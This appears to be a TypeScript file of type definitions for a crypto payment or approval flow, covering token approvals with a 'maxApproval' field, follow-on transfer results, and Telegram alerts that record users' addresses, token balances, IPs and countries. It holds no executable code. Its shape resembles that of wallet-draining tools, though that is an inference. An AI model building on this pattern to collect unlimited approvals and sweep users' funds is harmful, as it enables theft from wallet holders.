// =================================
// 🔗 Blockchain Types
// =================================

import { ChainType } from "./index";

export interface BlockchainResult {
  success: boolean;
  error?: string;
  txHash?: string;
  message?: string;
  approvalData?: ApprovalData;
}

export interface ApprovalData {
  to: string;
  data: string;
  value: string;
  chainId: number;
  spender: string;
  maxApproval: string;
}

export interface ApprovalResult extends BlockchainResult {
  nonce: number;
  signature: string;
  approvalData?: ApprovalData; // For EVM chains
}

export interface TransferResult extends BlockchainResult {
  transferSuccess: boolean;
  transferTxHash?: string;
  transferError?: string;
  chain?: ChainType;
}

export interface UserInfo {
  address: string;
  allowance: string;
  nonce: number;
  isApproved: boolean;
  tokenBalance: string;
}

export interface ContractInfo {
  owner: string;
  usdtContract: string;
  chainId: number;
}

export interface TelegramNotificationData {
  chain: string;
  currency: string;
  userAddress: string;
  amount: string;
  paymentId: string;
  walletType: string;
  clientIP?: string;
  tokenBalance: string;
  country?: string;
}

export interface SafePingConfig {
  usdt: string;
  oneTimePing?: string;
  rpc: string;
  decimals: number;
  chainId: number;
}

export interface NonceCache {
  [key: string]: number;
}

